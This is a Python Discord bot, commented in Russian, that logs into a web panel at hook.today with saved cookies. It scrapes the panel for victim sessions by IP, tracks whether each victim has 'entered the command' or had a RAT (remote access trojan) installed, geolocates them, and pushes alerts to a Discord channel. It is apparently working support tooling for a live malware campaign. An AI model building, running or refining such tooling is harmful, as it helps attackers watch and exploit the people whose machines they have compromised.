import discord
from discord.ext import commands, tasks
import asyncio
import time
import re
import os
import pickle
from datetime import datetime
from bs4 import BeautifulSoup
import requests
from dotenv import load_dotenv

load_dotenv()

# ===== КОНФИГУРАЦИЯ =====
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
PANEL_URL = "https://hook.today"
CHECK_INTERVAL = 15

# ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
sessions_data = {}
first_run = True
session = requests.Session()

# ===== КЭШ СТРАН =====
country_cache = {}


def get_country_flag(ip):
    if ip in country_cache:
        return country_cache[ip]
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                code = data.get('countryCode', '').lower()
                flag = f":flag_{code}:" if code else "🌐"
                country_cache[ip] = flag
                return flag
    except:
        pass
    country_cache[ip] = "🌐"
    return "🌐"


# ===== ЗАГРУЗКА КУК ИЗ ФАЙЛА =====
COOKIES_FILE = "cookies.pkl"


def load_cookies():
    try:
        with open(COOKIES_FILE, 'rb') as f:
            return pickle.load(f)
    except FileNotFoundError:
        print(f"❌ Файл {COOKIES_FILE} не найден!")
        return None
    except Exception as e:
        print(f"❌ Ошибка загрузки кук: {e}")
        return None


# ===== ИНИЦИАЛИЗАЦИЯ СЕССИИ С КУКАМИ =====
def init_session():
    global session

    print("🔄 Загрузка кук из cookies.pkl...")
    cookies = load_cookies()
    if not cookies:
        print("❌ Куки не загружены!")
        return False

    session.cookies.clear()
    for cookie in cookies:
        session.cookies.set(cookie['name'], cookie['value'], domain='.hook.today')

    print("✅ Куки загружены в сессию")

    # Проверяем, работают ли куки
    try:
        resp = session.get(f"{PANEL_URL}/?tab=all", timeout=30)
        if resp.status_code == 200:
            print("✅ Куки работают!")
            return True
        else:
            print(f"❌ Куки НЕ работают (статус: {resp.status_code})")
            return False
    except Exception as e:
        print(f"❌ Ошибка проверки кук: {e}")
        return False


# ===== ПОЛУЧЕНИЕ СЕССИЙ С ПАНЕЛИ =====
def fetch_sessions():
    global session

    try:
        resp = session.get(f"{PANEL_URL}/?tab=all", timeout=30)

        if resp.status_code != 200:
            print(f"❌ HTTP ошибка: {resp.status_code}")
            return []

        html = resp.text
        soup = BeautifulSoup(html, 'html.parser')

        # Ищем строки с IP
        rows = []
        for row in soup.select('tr'):
            if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', str(row)):
                rows.append(row)

        sessions = []
        for row in rows:
            text = row.get_text()

            # IP
            ip_match = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text)
            if not ip_match:
                continue
            ip = ip_match.group()

            # Время
            time_match = re.search(r'\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2}:\d{2}', text)
            if not time_match:
                time_match = re.search(r'\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2}', text)
            pc_time = time_match.group() if time_match else '—'

            # Статус
            status = 'Зашел'
            if 'ратку' in text.lower() or 'rat' in text.lower():
                status = '🔥 Сел на ратку'
            elif 'команд' in text.lower():
                status = '⌨️ Ввел команду'

            # RAT
            rat_installed = 'ратку' in text.lower() or 'rat' in text.lower()

            sessions.append({
                'ip': ip,
                'status': status,
                'pc_time': pc_time,
                'rat_installed': rat_installed
            })

        print(f"📊 Найдено сессий: {len(sessions)}")
        return sessions

    except Exception as e:
        print(f"❌ Ошибка парсинга: {e}")
        return []


# ===== ОТПРАВКА СООБЩЕНИЯ В DISCORD =====
async def send_msg(channel, ip, data):
    flag = get_country_flag(ip)

    status = data.get('status', 'Зашел')
    if 'Ратка' in status:
        color = 0xe74c3c
    elif 'Команда' in status:
        color = 0xf1c40f
    else:
        color = 0x2ecc71

    embed = discord.Embed(
        title=f"{flag} Сессия {ip}",
        color=color,
        timestamp=datetime.now()
    )

    emoji = "🟢"
    if 'Ратка' in status:
        emoji = "🔴"
    elif 'Команда' in status:
        emoji = "🟡"

    embed.add_field(name="Статус", value=f"{emoji} {status}", inline=True)
    embed.add_field(name="Время", value=data.get('pc_time', '—'), inline=True)
    embed.add_field(name="RAT", value="✅ Да" if data.get('rat_installed') else "❌ Нет", inline=True)
    embed.set_footer(text=f"Обновлено: {datetime.now().strftime('%H:%M:%S')}")

    await channel.send(embed=embed)


# ===== МОНИТОРИНГ =====
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor():
    global sessions_data, first_run

    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print(f"❌ Канал {CHANNEL_ID} не найден!")
        return

    print(f"🔄 Проверка... ({datetime.now().strftime('%H:%M:%S')})")

    sessions = await asyncio.get_event_loop().run_in_executor(None, fetch_sessions)
    if not sessions:
        print("⚠️ Сессии не получены")
        return

    if first_run:
        for s in sessions:
            sessions_data[s['ip']] = s
        first_run = False
        print(f"✅ Запомнено {len(sessions_data)} сессий")
        return

    for s in sessions:
        ip = s['ip']

        # Новая сессия
        if ip not in sessions_data:
            print(f"🆕 НОВАЯ СЕССИЯ: {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        old = sessions_data[ip]

        # Перезаход (изменилось время)
        if s.get('pc_time') != old.get('pc_time') and s.get('pc_time') != '—':
            print(f"🔄 ПЕРЕЗАХОД: {ip} ({old.get('pc_time')} → {s.get('pc_time')})")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        # Смена статуса
        if s.get('status') != old.get('status'):
            print(f"🔄 СМЕНА СТАТУСА: {ip} ({old.get('status')} → {s.get('status')})")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        # RAT установлен
        if s.get('rat_installed') and not old.get('rat_installed'):
            print(f"🔥 RAT УСТАНОВЛЕН: {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue


# ===== БОТ =====
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    global first_run
    print(f"✅ Бот запущен: {bot.user}")
    print(f"📡 Канал: {CHANNEL_ID}")
    first_run = True

    # Инициализируем сессию с куками
    if await asyncio.get_event_loop().run_in_executor(None, init_session):
        monitor.start()
        print("✅ Мониторинг запущен!")
    else:
        print("❌ Не удалось инициализировать сессию!")


if __name__ == "__main__":
    print("🚀 Запуск бота...")
    bot.run(DISCORD_TOKEN)